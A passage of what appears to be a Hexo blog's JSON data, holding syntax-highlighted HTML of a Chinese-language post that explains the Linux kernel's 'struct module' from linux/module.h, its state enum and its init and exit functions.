*gpl_crcs;</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_UNUSED_SYMBOLS</span></div><div class=\"line\">\t<span class=\"comment\">/* unused exported symbols. */</span></div><div class=\"line\">\t<span class=\"keyword\">const</span> <span class=\"keyword\">struct</span> kernel_symbol *unused_syms;</div><div class=\"line\">\t<span class=\"keyword\">const</span> s32 *unused_crcs;</div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_unused_syms;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* GPL-only, unused exported symbols. */</span></div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_unused_gpl_syms;</div><div class=\"line\">\t<span class=\"keyword\">const</span> <span class=\"keyword\">struct</span> kernel_symbol *unused_gpl_syms;</div><div class=\"line\">\t<span class=\"keyword\">const</span> s32 *unused_gpl_crcs;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_MODULE_SIG</span></div><div class=\"line\">\t<span class=\"comment\">/* Signature was verified. */</span></div><div class=\"line\">\t<span class=\"keyword\">bool</span> sig_ok;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">bool</span> async_probe_requested;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* symbols that will be GPL-only in the near future. */</span></div><div class=\"line\">\t<span class=\"keyword\">const</span> <span class=\"keyword\">struct</span> kernel_symbol *gpl_future_syms;</div><div class=\"line\">\t<span class=\"keyword\">const</span> s32 *gpl_future_crcs;</div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_gpl_future_syms;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Exception table */</span></div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_exentries;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> exception_table_entry *extable;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Startup function. */</span></div><div class=\"line\">\t<span class=\"keyword\">int</span> (*init)(<span class=\"keyword\">void</span>);</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Core layout: rbtree is accessed frequently, so keep together. */</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> module_layout core_layout __module_layout_align;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> module_layout init_layout;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Arch-specific module values */</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> mod_arch_specific arch;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> taints;\t<span class=\"comment\">/* same bits as kernel:taint_flags */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_GENERIC_BUG</span></div><div class=\"line\">\t<span class=\"comment\">/* Support for BUG */</span></div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> num_bugs;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> list_head bug_list;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> bug_entry *bug_table;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_KALLSYMS</span></div><div class=\"line\">\t<span class=\"comment\">/* Protected by RCU and/or module_mutex: use rcu_dereference() */</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> mod_kallsyms *kallsyms;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> mod_kallsyms core_kallsyms;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Section attributes */</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> module_sect_attrs *sect_attrs;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Notes attributes */</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> module_notes_attrs *notes_attrs;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* The command line arguments (may be mangled).  People like</span></div><div class=\"line\">\t   keeping pointers to this stuff */</div><div class=\"line\">\t<span class=\"keyword\">char</span> *args;</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_SMP</span></div><div class=\"line\">\t<span class=\"comment\">/* Per-cpu data. */</span></div><div class=\"line\">\t<span class=\"keyword\">void</span> __percpu *percpu;</div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> percpu_size;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_TRACEPOINTS</span></div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_tracepoints;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> tracepoint * <span class=\"keyword\">const</span> *tracepoints_ptrs;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> HAVE_JUMP_LABEL</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> jump_entry *jump_entries;</div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_jump_entries;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_TRACING</span></div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_trace_bprintk_fmt;</div><div class=\"line\">\t<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **trace_bprintk_fmt_start;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_EVENT_TRACING</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> trace_event_call **trace_events;</div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_trace_events;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> trace_eval_map **trace_evals;</div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_trace_evals;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_FTRACE_MCOUNT_RECORD</span></div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_ftrace_callsites;</div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> *ftrace_callsites;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_LIVEPATCH</span></div><div class=\"line\">\t<span class=\"keyword\">bool</span> klp; <span class=\"comment\">/* Is this a livepatch module? */</span></div><div class=\"line\">\t<span class=\"keyword\">bool</span> klp_alive;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Elf information */</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> klp_modinfo *klp_info;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_MODULE_UNLOAD</span></div><div class=\"line\">\t<span class=\"comment\">/* What modules depend on me? */</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> list_head source_list;</div><div class=\"line\">\t<span class=\"comment\">/* What modules do I depend on? */</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> list_head target_list;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Destruction function. */</span></div><div class=\"line\">\t<span class=\"keyword\">void</span> (*<span class=\"built_in\">exit</span>)(<span class=\"keyword\">void</span>);</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">atomic_t</span> refcnt;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_CONSTRUCTORS</span></div><div class=\"line\">\t<span class=\"comment\">/* Constructor functions. */</span></div><div class=\"line\">\t<span class=\"keyword\">ctor_fn_t</span> *ctors;</div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_ctors;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\">&#125; ____cacheline_aligned __randomize_layout;</div></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<p><code>state</code>字段是模块内部状态，可以有四个值<br><figure class=\"highlight crystal\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"class\"><span class=\"keyword\">enum</span> <span class=\"title\">module_state</span> &#123;</span></div><div class=\"line\">\tMODULE_STATE_LIVE,\t<span class=\"regexp\">/* Normal state. */</span></div><div class=\"line\">\tMODULE_STATE_COMING,\t<span class=\"regexp\">/* Full formed, running module_init. */</span></div><div class=\"line\">\tMODULE_STATE_GOING,\t<span class=\"regexp\">/* Going away. */</span></div><div class=\"line\">\tMODULE_STATE_UNFORMED,\t<span class=\"regexp\">/* Still setting it up. */</span></div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure></p>\n<p>模块的初始化方法<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/* Startup function. */</span></div><div class=\"line\"><span class=\"keyword\">int</span> (*init)(<span class=\"keyword\">void</span>);</div></pre></td></tr></table></figure></p>\n<p>模块的卸载方法，其中有两个链表，分别表示依赖该模块和该模块依赖的模块<br><figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#ifdef CONFIG_MODULE_UNLOAD</span></div><div class=\"line\">\t<span class=\"regexp\">/* What modules depend on me? */</span></div><div class=\"line\">\tstruct list_head source_list;</div><div class=\"line\">\t<span class=\"regexp\">/* What modules do I depend on? */</span></div><div class=\"line\">\tstruct list_head target_list;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"regexp\">/* Destruction function. */</span></div><div class=\"line\">\tvoid (*<span class=\"keyword\">exit</span>)(void);</div><div class=\"line\"></div><div class=\"line\">\tatomic_t refcnt;</div><div class=\"line\"><span class=\"comment\">#endif</span></div></pre></td></tr></table></figure></p>\n","excerpt":"<h2 id=\"linux-module-h\"><a href=\"#linux-module-h\" class=\"headerlink\" title=\"linux/module.h\"></a>linux/module.h</h2><p>重要结构体，该结构体包含<code>module</code>的几乎所有信息<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div><div class=\"line\">147</div><div class=\"line\">148</div><div class=\"line\">149</div><div class=\"line\">150</div><div class=\"line\">151</div><div class=\"line\">152</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">struct</span> <span class=\"keyword\">module</span> &#123;</div><div class=\"line\">\t<span class=\"keyword\">enum</span> module_state state;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Member of list of modules */</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> list_head <span class=\"built_in\">list</span>;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Unique handle for this module */</span></div><div class=\"line\">\t<span class=\"keyword\">char</span> name[MODULE_NAME_LEN];</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Sysfs stuff. */</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> module_kobject mkobj;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> module_attribute *modinfo_attrs;</div><div class=\"line\">\t<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *version;</div><div class=\"line\">\t<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *srcversion;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> kobject *holders_dir;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Exported symbols */</span></div><div class=\"line\">\t<span class=\"keyword\">const</span> <span class=\"keyword\">struct</span> kernel_symbol *syms;</div><div class=\"line\">\t<span class=\"keyword\">const</span> s32 *crcs;</div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_syms;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Kernel parameters. */</span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_SYSFS</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> mutex param_lock;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> kernel_param *kp;</div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_kp;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* GPL-only exported symbols. */</span></div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_gpl_syms;</div><div class=\"line\">\t<span class=\"keyword\">const</span> <span class=\"keyword\">struct</span> kernel_symbol *gpl_syms;</div><div class=\"line\">\t<span class=\"keyword\">const</span> s32 *gpl_crcs;</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_UNUSED_SYMBOLS</span></div><div class=\"line\">\t<span class=\"comment\">/* unused exported symbols. */</span></div><div class=\"line\">\t<span class=\"keyword\">const</span> <span class=\"keyword\">struct</span> kernel_symbol *unused_syms;</div><div class=\"line\">\t<span class=\"keyword\">const</span> s32 *unused_crcs;</div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_unused_syms;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* GPL-only, unused exported symbols. */</span></div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_unused_gpl_syms;</div><div class=\"line\">\t<span class=\"keyword\">const</span> <span class=\"keyword\">struct</span> kernel_symbol *unused_gpl_syms;</div><div class=\"line\">\t<span class=\"keyword\">const</span> s32 *unused_gpl_crcs;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_MODULE_SIG</span></div><div class=\"line\">\t<span class=\"comment\">/* Signature was verified. */</span></div><div class=\"line\">\t<span class=\"keyword\">bool</span> sig_ok;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">bool</span> async_probe_requested;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* symbols that will be GPL-only in the near future. */</span></div><div class=\"line\">\t<span class=\"keyword\">const</span> <span class=\"keyword\">struct</span> kernel_symbol *gpl_future_syms;</div><div class=\"line\">\t<span class=\"keyword\">const</span> s32 *gpl_future_crcs;</div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_gpl_future_syms;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Exception table */</span></div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_exentries;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> exception_table_entry *extable;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Startup function. */</span></div><div class=\"line\">\t<span class=\"keyword\">int</span> (*init)(<span class=\"keyword\">void</span>);</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Core layout: rbtree is accessed frequently, so keep together. */</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> module_layout core_layout __module_layout_align;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> module_layout init_layout;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Arch-specific module values */</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> mod_arch_specific arch;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> taints;\t<span class=\"comment\">/* same bits as kernel:taint_flags */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_GENERIC_BUG</span></div><div class=\"line\">\t<span class=\"comment\">/* Support for BUG */</span></div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> num_bugs;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> list_head bug_list;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> bug_entry *bug_table;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_KALLSYMS</span></div><div class=\"line\">\t<span class=\"comment\">/* Protected by RCU and/or module_mutex: use rcu_dereference() */</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> mod_kallsyms *kallsyms;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> mod_kallsyms core_kallsyms;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Section attributes */</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> module_sect_attrs *sect_attrs;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Notes attributes */</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> module_notes_attrs *notes_attrs;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* The command line arguments (may be mangled).  People like</span></div><div class=\"line\">\t   keeping pointers to this stuff */</div><div class=\"line\">\t<span class=\"keyword\">char</span> *args;</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_SMP</span></div><div class=\"line\">\t<span class=\"comment\">/* Per-cpu data. */</span></div><div class=\"line\">\t<span class=\"keyword\">void</span> __percpu *percpu;</div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> percpu_size;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_TRACEPOINTS</span></div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_tracepoints;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> tracepoint * <span class=\"keyword\">const</span> *tracepoints_ptrs;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> HAVE_JUMP_LABEL</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> jump_entry *jump_entries;</div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_jump_entries;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_TRACING</span></div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_trace_bprintk_fmt;</div><div class=\"line\">\t<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **trace_bprintk_fmt_start;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_EVENT_TRACING</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> trace_event_call **trace_events;</div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_trace_events;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> trace_eval_map **trace_evals;</div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_trace_evals;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_FTRACE_MCOUNT_RECORD</span></div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_ftrace_callsites;</div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> *ftrace_callsites;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_LIVEPATCH</span></div><div class=\"line\">\t<span class=\"keyword\">bool</span> klp; <span class=\"comment\">/* Is this a livepatch module? */</span></div><div class=\"line\">\t<span class=\"keyword\">bool</span> klp_alive;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Elf information */</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> klp_modinfo *klp_info;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_MODULE_UNLOAD</span></div><div class=\"line\">\t<span class=\"comment\">/* What modules depend on me? */</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> list_head source_list;</div><div class=\"line\">\t<span class=\"comment\">/* What modules do I depend on? */</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> list_head target_list;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Destruction function. */</span></div><div class=\"line\">\t<span class=\"keyword\">void</span> (*<span class=\"built_in\">exit</span>)(<span class=\"keyword\">void</span>);</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">atomic_t</span> refcnt;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_CONSTRUCTORS</span></div><div class=\"line\">\t<span class=\"comment\">/* Constructor functions. */</span></div><div class=\"line\">\t<span class=\"keyword\">ctor_fn_t</span> *ctors;</div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_ctors;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\">&#125; ____cacheline_aligned __randomize_layout;</div></pre></td></tr></table></figure></p>","more":"<p><code>state</code>字段是模块内部状态，可以有四个值<br><figure class=\"highlight crystal\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"class\"><span class=\"keyword\">enum</span> <span class=\"title\">module_state</span> &#123;</span></div><div class=\"line\">\tMODULE_STATE_LIVE,\t<span class=\"regexp\">/* Normal state. */</span></div><div class=\"line\">\tMODULE_STATE_COMING,\t<span class=\"regexp\">/* Full formed, running module_init. */</span></div><div class=\"line\">\tMODULE_STATE_GOING,\t<span class=\"regexp\">/* Going away. */</span></div><div class=\"line\">\tMODULE_STATE_UNFORMED,\t<span class=\"regexp\">/* Still setting it up. */</span></div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure></p>\n<p>模块的初始化方法<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/* Startup function. */</span></div><div class=\"line\"><span class=\"keyword\">int</span> (*init)(<span class=\"keyword\">void</span>);</div></pre></td></tr></table></figure></p>\n<p>模块的卸载方法，其中有两个链表，分别表示依赖该模块和该模块依赖的模块<br><figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#ifdef CONFIG_MODULE_UNLOAD</span></div><div class=\"line\">\t<span class=\"regexp\">/* What modules depend on me? */</span></div><div class=\"line\">\tstruct list_head source_list;</div><div class=\"line\">\t<span class=\"regexp\">/* What modules do I depend on? */</span></div><div class=\"line\">\tstruct list_head target_list;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"regexp\">/* Destruction function. */</span></div><div class=\"line\">\tvoid (*<span class=\"keyword\">exit</span>)(void);</div><div class=\"line\"></div><div class=\"line\">\tatomic_t refcnt;</div><div class=\"line\"><span 